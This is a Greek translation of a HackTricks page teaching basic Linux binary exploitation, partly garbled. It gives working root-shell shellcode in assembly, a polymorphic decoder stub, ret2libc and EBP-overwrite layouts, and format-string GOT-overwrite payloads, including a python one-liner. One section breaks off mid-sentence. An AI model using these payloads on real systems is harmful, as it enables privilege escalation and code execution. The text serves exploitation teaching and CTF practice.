# Linux Exploiting (Βασικό) (SPA)

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Ερυθρού Συνεργείου AWS του HackTricks)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## **1.ΥΠΕΡΡΟΗΣΕΙΣ ΣΤΗΝ ΣΤΟΙΒΑ (STACK OVERFLOWS)**

> buffer overflow, buffer overrun, stack overrun, stack smashing

Segmentation fault ή παραβίαση τμήματος: Όταν προσπαθείτε να αποκτήσετε πρόσβαση σε μια διεύθυνση μνήμης που δεν έχει εκχωρηθεί στη διαδικασία.

Για να λάβετε τη διεύθυνση μιας συνάρτησης μέσα σε ένα πρόγραμμα μπορείτε να κάνετε:
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### Κλήση στο sys\_execve

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

View kernel interrupts: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep “\_\_NR\_”

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(“/bin/sh”, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; clear eax\
xor ebx, ebx ; ebx = 0 as there are no arguments to pass\
mov al, 0x01 ; eax = 1 —> \_\_NR\_exit 1\
int 0x80 ; Execute syscall

**nasm -f elf assembly.asm** —> Returns a .o file\
**ld assembly.o -o shellcodeout** —> Gives us an executable containing the assembly code and we can extract the opcodes with **objdump**\
**objdump -d -Mintel ./shellcodeout** —> To verify that it is indeed our shellcode and extract the OpCodes

**Verify that the shellcode works**
```
char shellcode[] = “\x31\xc0\x31\xdb\xb0\x01\xcd\x80”

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
Για να ελέγξετε αν οι κλήσεις συστήματος γίνονται σωστά, πρέπει να μεταγλωττίσετε το πρόγραμμα παραπάνω και οι κλήσεις συστήματος πρέπει να εμφανιστούν στο **strace ./PROGRAMA\_COMPILADO**

Κατά τη δημιουργία shellcodes μπορείτε να χρησιμοποιήσετε ένα κόλπο. Η πρώτη εντολή είναι ένα jump σε ένα call. Το call καλεί τον αρχικό κώδικα και επιπλέον τοποθετεί το EIP στο stack. Μετά την εντολή call έχουμε τοποθετήσει το string που χρειαζόμαστε, έτσι με αυτό το EIP μπορούμε να δείξουμε στο string και να συνεχίσουμε να εκτελούμε τον κώδικα.

Π.χ. **ΚΟΛΠΟ (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al último call
popl                %esi                                       ; Guardamos en ese la dirección al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=“/bin/sh”
leal                 0x8(%esi), %ecx      ; arg[2] = {“/bin/sh”, “0”}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(“/bin/sh”, [“/bin/sh”, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instrución
.string             \”/bin/sh\”                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
**Χρήση του Stack(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; “\0”
push               dword 0x68732f2f ; “//sh”
push               dword 0x6e69622f; “/bin”
mov                ebx, esp                     ; arg1 = “/bin//sh\0”
push               eax                             ; Null -> args[1]
push               ebx                             ; “/bin/sh\0” -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(“/bin/sh”, args[“/bin/sh”, “NULL”], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutó fabs
…
```
**Κυνηγός Αυγών:**

Αυτό είναι ένα μικρό κομμάτι κώδικα που διατρέχει τις σελίδες μνήμης που σχετίζονται με ένα διεργασία σε αναζήτηση του shellcode που είναι αποθηκευμένο εκεί (ψάχνοντας για κάποια υπογραφή που έχει τοποθετηθεί στο shellcode). Χρήσιμο όταν υπάρχει μικρός χώρος για να ενθετηθεί κώδικας.

**Πολυμορφικά Shellcodes**

Αυτά είναι κρυπτογραφημένα shellcodes που περιέχουν ένα μικρό κομμάτι κώδικα που τα αποκρυπτογραφεί και αλλάζει σε αυτό, χρησιμοποιώντας το κόλπο του Call-Pop, αυτό θα ήταν ένα **παράδειγμα κρυπτογράφησης μετατόπισης καίσαρα**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerá)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aquí va el shellcode
```
1. **Επίθεση στο Frame Pointer (EBP)**

Χρήσιμο όταν μπορούμε να τροποποιήσουμε το EBP αλλά όχι το EIP.

Είναι γνωστό ότι κατά την έξοδο από μια συνάρτηση εκτελείται ο παρακάτω κώδικας συναρμολόγησης:
```
movl               %ebp, %esp
popl                %ebp
ret
```
Με αυτόν τον τρόπο, μπορεί να τροποποιηθεί το EBP κατά την έξοδο από μια συνάρτηση (fvuln) που κλήθηκε από μια άλλη συνάρτηση, ώστε όταν η συνάρτηση που κάλεσε την fvuln ολοκληρωθεί, το EIP της μπορεί να τροποποιηθεί.

Στην fvuln μπορεί να εισαχθεί ένα ψευδές EBP που να δείχνει σε ένα σημείο όπου βρίσκεται η διεύθυνση του shellcode + 4 (πρέπει να προστεθεί 4 λόγω του pop). Έτσι, κατά την έξοδο από τη συνάρτηση, θα εισαχθεί στο ESP η τιμή του &(\&Shellcode)+4, με το pop θα αφαιρεθεί το 4 από το ESP και αυτό θα δείχνει στη διεύθυνση του shellcode όταν εκτελεστεί το ret.

**Exploit:**\
\&Shellcode + "AAAA" + SHELLCODE + γέμισμα + &(\&Shellcode)+4

**Off-by-One Exploit**\
Επιτρέπεται η τροποποίηση μόνο του λιγότερο σημαντικού byte του EBP. Μπορεί να πραγματοποιηθεί μια επίθεση όπως παραπάνω, αλλά η μνήμη που κρατά τη διεύθυνση του shellcode πρέπει να μοιράζεται τα πρώτα 3 bytes με το EBP.

## **4. Μέθοδοι επιστροφής στην βιβλιοθήκη C**

Χρήσιμη μέθοδος όταν το stack δεν είναι εκτελέσιμο ή αφήνει ένα πολύ μικρό buffer για τροποποίηση.

Το ASLR προκαλεί τη φόρτωση των συναρτήσεων σε διαφορετικές θέσεις μνήμης κάθε φορά που εκτελείται το πρόγραμμα. Συνεπώς, αυτή η μέθοδος ενδέχεται να μην είναι αποτελεσματική σε αυτήν την περίπτωση. Για απομακρυσμένους διακομιστές, καθώς το πρόγραμμα εκτελείται συνεχώς στην ίδια διεύθυνση, μπορεί να είναι χρήσιμη.

* **cdecl(C declaration)** Τοποθετεί τα ορίσματα στο stack και μετά την έξοδο από τη συνάρτηση καθαρίζει τη στοίβα
* **stdcall(standard call)** Τοποθετεί τα ορίσματα στη στοίβα και είναι η συνάρτηση που καλείται που την καθαρίζει
* **fastcall** Τοποθετεί τα δύο πρώτα ορίσματα στους καταχωρητές και τα υπόλοιπα στη στοίβα

Τοποθετείται η διεύθυνση της εντολής system της libc και χρησιμοποιείται ως όρισμα η συμβολοσειρά “/bin/sh”, συνήθως από μια μεταβλητή περιβάλλοντος. Επιπλέον, χρησιμοποιείται η διεύθυνση της συνάρτησης exit ώστε όταν δεν χρειάζεται πλέον η κέλυφος, το πρόγραμμα να τερματιστεί χωρίς προβλήματα (και εγγραφή καταγραφών).

**export SHELL=/bin/sh**

Για να βρούμε τις απαιτούμενες διευθύνσεις, μπορούμε να κοιτάξουμε μέσα στο **GDB:**\
**p system**\
**p exit**\
**rabin2 -i εκτελέσιμο** —> Δίνει τη διεύθυνση όλων των συναρτήσεων που χρησιμοποιεί το πρόγραμμα κατά τη φόρτωση\
(Μέσα σε ένα start ή κάποιο breakpoint): **x/500s $esp** —> Αναζητούμε μέσα εδώ τη συμβολοσειρά /bin/sh

Αφού έχουμε αυτές τις διευθύνσεις, το **exploit** θα είναι:

“A” \* ΑΠΟΣΤΑΣΗ EBP + 4 (EBP: μπορεί να είναι 4 "A"s αλλά καλύτερα να είναι το πραγματικό EBP για να αποφευχθούν σφάλματα σεγμενταρίωσης) + Διεύθυνση **system** (θα αντικαταστήσει το EIP) + Διεύθυνση **exit** (κατά την έξοδο από το system(“/bin/sh”) θα κληθεί αυτή η συνάρτηση καθώς τα πρώτα 4bytes της στοίβας θεωρούνται η επόμενη διεύθυνση του EIP που θα εκτελεστεί) + Διεύθυνση “**/bin/sh**” (θα είναι το παράμετρο που περνάται στο system)

Με αυτόν τον τρόπο, το EIP θα αντικατασταθεί με τη διεύθυνση του system η οποία θα λάβει ως παράμετρο τη συμβολοσειρά “/bin/sh” και κατά την έξοδο από αυτή θα εκτελεστεί η συνάρτηση exit().

Είναι δυνατόν να βρεθεί κάποιο byte μιας διεύθυνσης μιας συνάρτησης να είναι μηδέν ή κενό (\x20). Σε αυτήν την περίπτωση, μπορούμε να αποσυναρμολογήσουμε τις προηγούμενες διευθύνσεις προς τη συγκεκριμένη συνάρτηση καθώς πιθανόν να υπάρχουν πολλά NOPs που θα μας επιτρέψουν να καλέσουμε έναν από αυτούς αντί για τη συνάρτηση απευθείας (π.χ. με > x/8i system-4).

Αυτή η μέθοδο λειτουργεί καθώς καλώντας μια συνάρτηση όπως η system χρησιμοποιώντας τον opcode **ret** αντί για **call**, η συνάρτηση καταλαβαίνει ότι τα πρώτα 4bytes θα είναι η διεύθυνση **EIP** στην οποία θα επιστρέψει.

Μια ενδιαφέρουσα τεχνική με αυτήν τη μέθοδο είναι να καλέσετε τη **strncpy()** για να μετακινήσετε ένα payload από τη στοίβα στη σωρό και στη συνέχεια να χρησιμοποιήσετε το **gets()** για να εκτελέσετε το συγκεκριμένο payload.

Μια άλλη ενδιαφέρουσα τεχνική είναι η χρήση της **mprotect()** η οποία επιτρέπει την ανάθεση των επιθυμητών δικαιωμάτων σε οποιοδήποτε τμήμα της μνήμης. Λειτουργεί ή λειτουργούσε σε BDS, MacOS και OpenBSD, αλλά όχι σε Linux (ελέγχει ώστε να μην είναι δυνατή η απόδοση ταυτόχρονα δικαιωμάτων εγγραφής και εκτέλεσης). Με αυτήν την επίθεση θα μπορούσατε να επαναρρυθμίσετε τη στοίβα ως εκτελέσιμη.

**Αλυσίδωση συναρτήσεων**

Βασιζόμενοι στην προηγούμενη τεχνική, αυτή η μορφή εκμετάλλευσης αποτελείται από:\
Γέμισμα + \&Συνάρτηση1 + \&pop;ret; + \&arg\_fun1 + \&Συνάρτηση2 + \&pop;ret; + \&arg\_fun2 + …

Με αυτόν τον τρόπο μπορούν να αλυσίδωται συναρτήσεις προς κλήση. Επιπλέον, αν θέλετε να χρησιμοποιήσετε συναρτήσεις με πολλά ορίσματα, μπορείτε να τοποθετήσετε τα απαιτούμενα ορίσματα (π.χ. 4) και να βρείτε τα 4 ορίσματα και να αναζητήσετε τη διεύθυνση σε ένα σημείο με opcodes: pop, pop, pop, pop, ret —> **objdump -d εκτελέσιμο**

**Αλυσίδωση μέσω πλαστογράφησης πλαισίων (αλυσίδωση των EBPs)**

Αξιοποιώντας τη δυνατότητα να διαχειριστείτε το EBP, αυτή η μορφή εκμετάλλευσης συνίσταται στο να αλυσίδωσετε την εκτέλεση πολλών συναρτήσεων μέσω του EBP και του "leave;ret"

ΓΕΜΙΣΜΑ

* Τοποθετούμε στο EBP ένα ψευδές EBP που να δείχνει σε: 2ο ψευδές EBP + η συνάρτηση που θα εκτελεστεί: (\&system() + \&leave;ret + &“/bin/sh”)
* Στο EIP τοποθετούμε ως διεύθυν
```
**Ret2PopRet**
```
**Τεχνική του Murat**

Στο Linux, όλα τα προγράμματα χαρτογραφούνται ξεκινώντας από το 0xbfffffff.

Παρατηρώντας πώς δημιουργείται η στοίβα ενός νέου διεργασίας στο Linux, μπορούμε να αναπτύξουμε ένα exploit έτσι ώστε το πρόγραμμα να εκκινείται σε ένα περιβάλλον όπου η μοναδική μεταβλητή είναι η shellcode. Η διεύθυνση αυτής μπορεί να υπολογιστεί ως: addr = 0xbfffffff - 4 - strlen(NOMBRE\_ejecutable\_completo) - strlen(shellcode)

Με αυτόν τον τρόπο, μπορούμε εύκολα να αντλήσουμε τη διεύθυνση όπου βρίσκεται η μεταβλητή περιβάλλοντος με τη shellcode.

Αυτό είναι δυνατό λόγω του ότι η συνάρτηση execle επιτρέπει τη δημιουργία ενός περιβάλλοντος που έχει μόνο τις μεταβλητές περιβάλλοντος που επιθυμούμε.

**Μετάβαση στο ESP: Στυλ Windows**

Καθώς το ESP δείχνει πάντα στην αρχή της στοίβας, αυτή η τεχνική αποτελείται από την αντικατάσταση του EIP με τη διεύθυνση μιας κλήσης **jmp esp** ή **call esp**. Με αυτόν τον τρόπο, η shellcode αποθηκεύεται μετά την αντικατάσταση του EIP, καθώς μετά την εκτέλεση του **ret**, το ESP θα δείχνει στην επόμενη διεύθυνση, ακριβώς εκεί όπου έχει αποθηκευτεί η shellcode.

Σε περίπτωση που το ASLR δεν είναι ενεργοποιημένο σε Windows ή Linux, μπορεί να γίνει κλήση σε **jmp esp** ή **call esp** που αποθηκεύονται σε κάποιο κοινόχρηστο αντικείμενο. Σε περίπτωση ενεργοποίησης του ASLR, θα μπορούσε να αναζητηθεί μέσα στο ίδιο ευάλωτο πρόγραμμα.

Επιπλέον, η δυνατότητα τοποθέτησης της shellcode μετά τη διαφθορά του EIP αντί για τη μέση της στοίβας επιτρέπει στις εντολές push ή pop που εκτελούνται στη μέση της συνάρτησης να μην αγγίξουν τη shellcode (κάτι που θα μπορούσε να συμβεί σε περίπτωση τοποθέτησής της στη μέση της στοίβας της συνάρτησης).

Παρόμοια με αυτό, αν γνωρίζουμε ότι μια συνάρτηση επιστρέφει τη διεύθυνση όπου αποθηκεύεται η shellcode, μπορούμε να καλέσουμε **call eax** ή **jmp eax (ret2eax).**

**Υπερχείλιση ακεραίων**

Αυτού του είδους οι υπερχειλίσεις συμβαίνουν όταν μια μεταβλητή δεν είναι προετοιμασμένη να υποστηρίξει ένα τόσο μεγάλο αριθμό όσο αυτός που δίνεται, πιθανώς λόγω σύγχυσης μεταξύ μεταβλητών με και χωρίς πρόσημο, για παράδειγμα:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
Στο παραπάνω παράδειγμα βλέπουμε ότι το πρόγραμμα αναμένει 2 παραμέτρους. Το πρώτο είναι το μήκος της επόμενης αλυσίδας και το δεύτερο η αλυσίδα.

Εάν δώσουμε έναν αρνητικό αριθμό ως πρώτη παράμετρο, θα εμφανιστεί ότι len < 256 και θα περάσουμε αυτό το φίλτρο, επιπλέον το strlen(buffer) θα είναι μικρότερο από το l, καθώς το l είναι unsigned int και θα είναι πολύ μεγάλο.

Αυτού του είδους τα overflows δεν αποσκοπούν στο να γράψουν κάτι στη διαδικασία του προγράμματος, αλλά να υπερβούν κακώς σχεδιασμένα φίλτρα για να εκμεταλλευτούν άλλες ευπαθείς σημεία.

**Μη αρχικοποιημένες μεταβλητές**

Δεν γνωρίζουμε την τιμή που μπορεί να πάρει μια μη αρχικοποιημένη μεταβλητή και θα μπορούσε να είναι ενδιαφέρον να την παρακολουθήσουμε. Μπορεί να πάρει την τιμή που είχε μια μεταβλητή από την προηγούμενη συνάρτηση και αυτή να ελέγχεται από τον επιτιθέμενο.

## **Συμβολοσειρές Μορφοποίησης**

Στη γλώσσα C, η **`printf`** είναι μια συνάρτηση που μπορεί να χρησιμοποιηθεί για να **εκτυπώσει** μια συμβολοσειρά. Η **πρώτη παράμετρος** που αναμένει αυτή η συνάρτηση είναι το **κείμενο με τους μορφοποιητές**. Οι **επόμενες παράμετροι** που αναμένονται είναι οι **τιμές** που θα **αντικατασταθούν** στους **μορφοποιητές** από το κείμενο.

Η ευπάθεια εμφανίζεται όταν ένας **επιτιθέμενος τοποθετείται ως η πρώτη παράμετρος** σε αυτή τη συνάρτηση. Ο επιτιθέμενος θα μπορεί να δημιουργήσει ένα **ειδικό είσοδο καταχρώμενο** τις **δυνατότητες της μορφοποίησης της printf** για να **γράψει οποιαδήποτε δεδομένα σε οποιαδήποτε διεύθυνση**. Με αυτόν τον τρόπο είναι δυνατή η **εκτέλεση αυθαίρετου κώδικα**.
```bash
%08x —> 8 hex bytes
%d —> Entire
%u —> Unsigned
%s —> String
%n —> Number of written bytes
%hn —> Occupies 2 bytes instead of 4
<n>$X —> Direct access, Example: ("%3$d", var1, var2, var3) —> Access to var3
```
**`%n`** **εγγράφει** τον **αριθμό των γραμμένων bytes** στην **καθορισμένη διεύθυνση. Γράφοντας** τόσα **bytes** όσα είναι το **δεκαεξαδικό νούμερο** που χρειάζεται να γραφτεί είναι πώς μπορείτε να **γράψετε οποιαδήποτε δεδομένα**.
```bash
AAAA%.6000d%4\$n —> Write 6004 in the address indicated by the 4º param
AAAA.%500\$08x —> Param at offset 500
```
### GOT (Global Offsets Table) / PLT (Procedure Linkage Table)

Αυτός είναι ο πίνακας που περιέχει τη διεύθυνση των εξωτερικών συναρτήσεων που χρησιμοποιούνται από το πρόγραμμα.

Λάβετε τη διεύθυνση αυτού του πίνακα με: `objdump -s -j .got ./exec`

![](<../../.gitbook/assets/image (619).png>)

Παρατηρήστε πώς μετά τη φόρτωση του εκτελέσιμου στο GEF μπορείτε να δείτε τις συναρτήσεις που βρίσκονται στο GOT: `gef➤ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

Χρησιμοποιώντας το GEF μπορείτε να ξεκινήσετε μια συνεδρία αποσφαλμάτωσης και να εκτελέσετε `got` για να δείτε τον πίνακα got:

![](<../../.gitbook/assets/image (621).png>)

Σε ένα δυαδικό το GOT έχει τις διευθύνσεις των συναρτήσεων ή του τμήματος PLT που θα φορτώσει τη διεύθυνση της συνάρτησης. Ο στόχος αυτής της εκμετάλλευσης είναι να αντικαταστήσετε την καταχώριση του GOT μιας συνάρτησης που θα εκτελεστεί αργότερα με τη διεύθυνση του PLT της συνάρτησης `system`. Ιδανικά, θα αντικαταστήσετε το GOT μιας συνάρτησης που θα κληθεί με παραμέτρους που ελέγχετε εσείς (ώστε να μπορείτε να ελέγξετε τις παραμέτρους που στέλνονται στη συνάρτηση συστήματος).

Αν η `system` δεν χρησιμοποιείται από το σενάριο, η συνάρτηση συστήματος δεν θα έχει μια καταχώριση στο GOT. Σε αυτό το σενάριο, θα χρειαστεί να διαρρεύσετε πρώτα τη διεύθυνση της συνάρτησης `system`.

Ο **Πίνακας Σύνδεσης Διαδικασίας** είναι ένας πίνακας με διαβάθμιση στο αρχείο ELF που αποθηκεύει όλα τα απαραίτητα σύμβολα που χρειάζονται ανάλυση. Όταν κληθεί μία από αυτές τις συναρτήσεις, το GOT θα ανακατευθύνει τη ροή στο PLT ώστε να αναλύσει τη διεύθυνση της συνάρτησης και να την γράψει στο GOT. Στη συνέχεια, την επόμενη φορά που γίνεται κλήση σε αυτή τη διεύθυνση, η συνάρτηση καλείται απευθείας χωρίς την ανάγκη να αναλυθεί ξανά.

Μπορείτε να δείτε τις διευθύνσεις του PLT με `objdump -j .plt -d ./vuln_binary`

### Ροή Εκμετάλλευσης

Όπως εξηγήθηκε προηγουμένως, ο στόχος θα είναι να αντικαταστήσετε τη διεύθυνση μιας συνάρτησης στον πίνακα GOT που θα κληθεί αργότερα. Ιδανικά θα μπορούσατε να ορίσετε τη διεύθυνση σε ένα shellcode που βρίσκεται σε ένα εκτελέσιμο τμήμα, αλλά είναι πιθανό να μην μπορέσετε να γράψετε ένα shellcode σε ένα εκτελέσιμο τμήμα. Έτσι, μια διαφορετική επιλογή είναι να αντικαταστήσετε μια συνάρτηση που λαμβάνει τα ορίσματά της από τον χρήστη και να την κατευθύνετε στη συνάρτηση `system`.

Για να γράψετε τη διεύθυνση, συνήθως γίνονται 2 βήματα: Πρώτα γράφετε 2Bytes της διεύθυνσης και στη συνέχεια τα άλλα 2. Για να το κάνετε αυτό χρησιμοποιείται το `$hn`.

Το **HOB** αναφέρεται στα 2 υψηλότερα bytes της διεύθυνσης\
Το **LOB** αναφέρεται στα 2 χαμηλότερα bytes της διεύθυνσης

Έτσι, λόγω του τρόπου λειτουργίας της format string, πρέπει να γράψετε πρώτα το μικρότερο από \[HOB, LOB] και στη συνέχεια το άλλο.

Αν HOB < LOB\
`[διεύθυνση+2][διεύθυνση]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

Αν HOB > LOB\
`[διεύθυνση+2][διεύθυνση]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB_shellcode-8 NºParam_dir_HOB LOB_shell-HOB_shell NºParam_dir_LOB

`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'`

### Πρότυπο Εκμετάλλευσης Συμβολοσειράς Μορφοποίησης

Μπορείτε να βρείτε ένα πρότυπο για την εκμετάλλευση του GOT χρησιμοποιώντας συμβολοσειρές μορφοποίησης εδώ:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### .fini_array

Βασικά, αυτή είναι μια δομή με συναρτήσεις που θα κληθούν πριν το πρόγραμμα τελειώσει. Αυτό είναι ενδιαφέρον αν μπορείτε να καλέσετε το shellcode σας απλά αναπηδώντας σε μια διεύθυνση, ή σε περιπτώσεις όπου χρειάζεται να επιστρέψετε πάλι στο κύριο πρόγραμμα για να εκμεταλλευτείτε τη συμβολοσειρά μορφοποίησης μια δεύτερη φορά.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Σημείωσε ότι αυτό **δεν** θα δημιουργήσει έναν **αιώνιο βρόγχο** επειδή όταν επιστρέψεις στο κύριο πρόγραμμα, το canary θα το παρατηρήσει, το τέλος της στοίβας μπορεί να έχει καταστραφεί και η συνάρτηση δεν θα κληθεί ξανά. Έτσι, με αυτό θα μπορείς να **έχεις 1 ακόμα εκτέλεση** του ευπαθούς.

### **Μορφοποίηση Συμβολοσειράς για Απορρόφηση Περιεχομένου**

Μια συμβολοσειρά μορφοποίησης μπορεί επίσης να καταχραστεί για να **απορροφήσει περιεχόμενο** από τη μνήμη του προγράμματος.\
Για παράδειγμα, στην ακόλουθη κατάσταση υπάρχει μια **τοπική μεταβλητή στη στοίβα που δείχνει σε ένα σημαία.** Αν **βρεις** πού στη **μνήμη** βρίσκεται το **δείκτης** προς τη **σημαία**, μπορείς να κάνεις το **printf να έχει πρόσβαση** σε αυτήν τη **διεύθυνση** και να **εκτυπώσει** τη **σημαία**:

Έτσι, η σημαία είναι στο **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

Και από τη διαρροή μπορείς να δεις ότι ο **δείκτης προς τη σημαία** είναι στην **8η** παράμετρο:

![](<../../.gitbook/assets/image (623).png>)

Έτσι, **έχοντας πρόσβαση** στην **8η παράμετρο** μπορείς να πάρεις τη σημαία:

![](<../../.gitbook/assets/image (624).png>)

Σημείωσε ότι ακολουθώντας τη **προηγούμενη εκμετάλλευση** και αντιλαμβανόμενος ότι μπορείς να **διαρρεύσεις περιεχόμενο** μπορείς να **ορίσεις δείκτες** στο **`printf`** στην ενότητα όπου το **εκτελέσιμο** φορτώνεται και να το **απορροφήσεις** **ολοκληρωτικά**!

### **DTOR**

{% hint style="danger" %}
Σήμερα είναι πολύ **παράξενο να βρεις ένα δυαδικό με μια ενότητα dtor**.
{% endhint %}

Οι καταστροφείς είναι συναρτήσεις που **εκτελούνται πριν το πρόγραμμα τελειώσει**.\
Αν καταφέρεις να **γράψεις** μια **διεύθυνση** σε ένα **shellcode** στο **`__DTOR_END__`**, αυτό θα **εκτελεστεί** πριν το πρόγραμμα τελειώσει.\
Πάρε τη διεύθυνση αυτής της ενότητας με:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep “__DTOR”
```
Συνήθως θα βρείτε την ενότητα **DTOR** **μεταξύ** των τιμών `ffffffff` και `00000000`. Έτσι, αν βλέπετε μόνο αυτές τις τιμές, σημαίνει ότι **δεν υπάρχει καμία συνάρτηση που έχει καταχωρηθεί**. Επομένως, **αντικαταστήστε** το **`00000000`** με την **διεύθυνση** του **shellcode** για να το εκτελέσετε.

### **Μορφοποίηση Συμβολοσειρών για Υπερχείλιση Προσωρινής Μνήμης**

Η **sprintf μετακινεί** μια μορφοποιημένη συμβολοσειρά **σε** μια **μεταβλητή**. Έτσι, μπορείτε να καταχραστείτε τη **μορφοποίηση** μιας συμβολοσειράς για να προκαλέσετε μια **υπερχείλιση προσωρινής μνήμης στη μεταβλητή** όπου αντιγράφεται το περιεχόμενο.\
Για παράδειγμα, το φορτίο `%.44xAAAA` θα **εγγράψει 44B+"AAAA" στη μεταβλητή**, το οποίο μπορεί να προκαλέσει υπερχείλιση προσωρινής μνήμης.

### **Δομές \_\_atexit**

{% hint style="danger" %}
Σήμερα είναι πολύ **παράξενο να εκμεταλλεύεστε αυτό**.
{% endhint %}

Η **`atexit()`** είναι μια συνάρτηση στην οποία **περνιούνται άλλες συναρτήσεις ως παράμετροι**. Αυτές οι **συναρτήσεις** θα **εκτελεστούν** κατά την εκτέλεση μιας **`exit()`** ή την **επιστροφή** από τη **main**.\
Αν μπορείτε να **τροποποιήσετε** τη **διεύθυνση** οποιασδήποτε από αυτές τις **συναρτήσεις** ώστε να δείχνει σε ένα shellcode για παράδειγμα, θα **κερδίσετε έλεγχο** της **διεργασίας**, αλλά αυτό είναι προς το παρόν πιο περίπλοκο.\
Προς το παρόν οι **διευθύνσεις των συναρτήσεων** που θα εκτελεστούν είναι **κρυμμένες** πίσω από αρκετές δομές και τελικά η διεύθυνση στην οποία δείχνουν δεν είναι οι διευθύνσεις των συναρτήσεων, αλλά είναι **κρυπτογραφημένες με XOR** και μετατοπίσεις με ένα **τυχαίο κλειδί**. Έτσι, αυτό το διάνυσμα επίθεσης δεν είναι πολύ χρήσιμο τουλάχιστον σε x86 και x64\_86.\
Η **συνάρτηση κρυπτογράφησης** είναι **`PTR_MANGLE`**. **Άλλες αρχιτεκτονικές** όπως m68k, mips32, mips64, aarch64, arm, hppa... **δεν υλοποιούν τη συνάρτηση κρυπτογράφησης** επειδή **επιστρέφουν το ίδιο** με αυτό που λαμβάνουν ως είσοδο. Έτσι, αυτές οι αρχιτεκτονικές θα μπορούσαν να είναι ευάλωτες σε αυτό το διάνυσμα επίθεσης.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Σήμερα είναι πολύ **παράξενο να εκμεταλλεύεστε αυτό**.
{% endhint %}

Η **`Setjmp()`** επιτρέπει τη **αποθήκευση** του **πλαισίου** (των καταχωρητών)\
Η **`longjmp()`** επιτρέπει τη **επαναφορά** του **πλαισίου**.\
Οι **αποθηκευμένοι καταχωρητές** είναι: `EBX, ESI, EDI, ESP, EIP, EBP`\
